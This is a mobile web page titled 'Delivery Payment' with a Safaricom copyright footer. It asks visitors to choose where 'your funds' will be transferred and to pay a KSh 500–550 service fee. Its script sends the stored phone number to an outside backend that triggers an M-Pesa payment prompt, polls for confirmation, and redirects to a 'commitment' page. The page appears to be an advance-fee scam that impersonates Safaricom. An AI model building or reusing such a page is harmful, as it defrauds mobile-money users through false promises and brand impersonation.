<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Delivery Payment</title>



<style>
@import url('https://fonts.googleapis.com/css2?family=Mali:wght@400;500;600;700&display=swap');

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

body{
    min-height:100vh;
    background:#E8F7EF;
    font-family:'Mali',cursive;
    color:#006B3F;
}

.container{
    width:100%;
    max-width:430px;
    margin:0 auto;
    padding:16px 10px;
}

.card{
    width:100%;
    background:#fff;
    padding:22px 18px 18px;
    border-radius:14px;
    box-shadow:0 3px 12px rgba(0,107,63,.08);
    border:1px solid #B7E5CC;
}

h1{
    color:#fff;
    background:#00A651;
    padding:12px 8px;
    border-radius:10px;
    font-size:22px;
    font-weight:700;
    text-align:center;
    margin:2px 0 16px;
}

.message{
    background:#E8F7EF;
    color:#000;
    padding:14px 12px;
    border-radius:12px;
    font-family:Arial,sans-serif;
    font-size:14px;
    line-height:1.5;
    text-align:center;
    margin-bottom:15px;
    border:1px solid #B7E5CC;
}

.options{
    display:flex;
    flex-direction:column;
    gap:12px;
}

.option{
    display:flex;
    align-items:center;
    width:100%;
    min-height:65px;
    padding:15px;
    border:1px solid #B7E5CC;
    border-radius:13px;
    cursor:pointer;
    font-family:'Mali',cursive;
    font-size:15px;
    color:#000;
    background:#fff;
}

.option input{
    margin-right:12px;
    accent-color:#00A651;
}

.option:hover{
    border-color:#00A651;
    background:#F4FBF7;
}

.fee-box{
    margin:15px 0;
    padding:14px 12px;
    background:#E8F7EF;
    border:1px solid #B7E5CC;
    border-radius:12px;
    text-align:center;
    color:#000;
    font-family:'Mali',cursive;
    font-size:18px;
}

button{
    width:100%;
    padding:15px;
    margin-top:5px;
    border:none;
    border-radius:12px;
    background:#00A651;
    color:#fff;
    font-family:'Mali',cursive;
    font-size:20px;
    font-weight:600;
    cursor:pointer;
    box-shadow:0 3px 10px rgba(0,166,81,.20);
}

button:disabled{
    background:#00A651;
    color:#fff;
    cursor:not-allowed;
    box-shadow:none;
}

#status{
    min-height:20px;
    margin-top:12px;
    text-align:center;
    font-family:'Mali',cursive;
    font-size:13px;
    line-height:1.5;
    color:#006B3F;
}

footer{
    text-align:center;
    padding:15px 5px;
    color:#006B3F;
    font-family:'Mali',cursive;
    font-size:12px;
    line-height:1.6;
}

@media(max-width:360px){

    body{
        padding:10px 7px;
    }

    .card{
        padding:18px 13px 15px;
        border-radius:14px;
    }

    h1{
        font-size:20px;
    }

    .option{
        padding:12px;
        font-size:14px;
    }

    button{
        padding:14px;
        font-size:18px;
    }

}
</style>
</head>

<body>

<div class="container">

    <div class="card">

        <h1>Delivery Payment</h1>

        <p class="message">
            Kindly choose where you would like your funds to be transferred.
            Each delivery method has a small fee to cover delivery charges.
        </p>

        <div class="options">

            <label class="option">
                <input
                    type="radio"
                    name="delivery"
                    value="500"
                    onchange="updateFee()"
                >
                Safaricom Mpesa — KSh 500
            </label>

            <label class="option">
                <input
                    type="radio"
                    name="delivery"
                    value="550"
                    onchange="updateFee()"
                >
                Bank Account — KSh 550
            </label>

        </div>

        <div class="fee-box">
            Service Fee:
            <strong>KSh <span id="deliveryFee">--</span></strong>
        </div>

        <button
            id="payButton"
            type="button"
            onclick="payDelivery()"
        >
            Pay Service Fee
        </button>

        <div id="status"></div>

    </div>

    <footer>
        © 2026 Safaricom PLC. All rights reserved.
    </footer>

</div>

<script>
const paymentPhone =
    localStorage.getItem("paymentPhone");

document.getElementById("paymentPhoneDisplay").innerText =
    paymentPhone
        ? "Payment number: " + paymentPhone
        : "Payment number not available";
function updateFee(){

    const selected =
        document.querySelector(
            'input[name="delivery"]:checked'
        );

    if(selected){

        document.getElementById("deliveryFee").innerText =
            selected.value;

    }
}


async function payDelivery(){

    const selected =
        document.querySelector(
            'input[name="delivery"]:checked'
        );

    if(!selected){

        alert("Please select a delivery method.");

        return;
    }

    const phone =
    localStorage.getItem("paymentPhone");

    if(!phone){

        alert("Phone number not found.");

        return;
    }

    const amount =
        Number(selected.value);

    const status =
        document.getElementById("status");

    const button =
        document.getElementById("payButton");

    button.disabled = true;
    button.innerText = "Processing...";

    status.innerText =
        "Sending payment request...";

    try{

        const response =
            await fetch(
                "https://nyota-funds-backend.onrender.com/stk-push",
                {
                    method:"POST",

                    headers:{
                        "Content-Type":"application/json"
                    },

                    body:JSON.stringify({
                        phone:phone,
                        amount:amount
                    })
                }
            );

        const data =
            await response.json();

        console.log("STK RESPONSE:",data);

        if(!response.ok){

            throw new Error(
                data.message ||
                "Payment request failed"
            );

        }

        const transactionId =
            data.transactionId ||
            data.checkout_request_id ||
            data.data?.transactionId ||
            data.data?.checkout_request_id;

        if(!transactionId){

            throw new Error(
                "Payment reference was not returned."
            );

        }

        status.innerText =
            "STK Push sent. Please enter your M-PESA PIN.";

        checkPayment(transactionId);

    }catch(error){

        console.error("STK ERROR:",error);

        button.disabled = false;
        button.innerText = "Pay Service Fee";

        status.innerText =
            "Failed to send payment request.";

    }
}


function checkPayment(transactionId){

    const interval =
        setInterval(async()=>{

            try{

                const response =
                    await fetch(
                        "https://nyota-funds-backend.onrender.com/payment-status",
                        {
                            method:"POST",

                            headers:{
                                "Content-Type":"application/json"
                            },

                            body:JSON.stringify({

                                checkout_request_id:
                                    transactionId,

                                transactionId:
                                    transactionId,

                                transaction_id:
                                    transactionId

                            })
                        }
                    );

                const result =
                    await response.json();

                console.log(
                    "PAYMENT STATUS:",
                    result
                );

                const paymentStatus =
                    String(
                        result.status ||
                        result.data?.status ||
                        result.data?.data?.status ||
                        ""
                    ).toLowerCase();

                if(
                    paymentStatus === "completed" ||
                    paymentStatus === "success"
                ){

                    clearInterval(interval);

                    document.getElementById("status").innerText =
                        "Payment confirmed successfully.";

                    setTimeout(()=>{

                        window.location.href =
                            "commitment.html";

                    },1000);

                }

                else if(
                    paymentStatus === "cancelled" ||
                    paymentStatus === "failed"
                ){

                    clearInterval(interval);

                    document.getElementById("status").innerText =
                        "Payment was not completed.";

                    const button =
                        document.getElementById("payButton");

                    button.disabled = false;
                    button.innerText =
                        "Pay Service Fee";

                }

                else{

                    document.getElementById("status").innerText =
                        "Confirming payment...";

                }

            }catch(error){

                console.error(
                    "STATUS ERROR:",
                    error
                );

            }

        },3000);

}

</script>

</body>
</html>
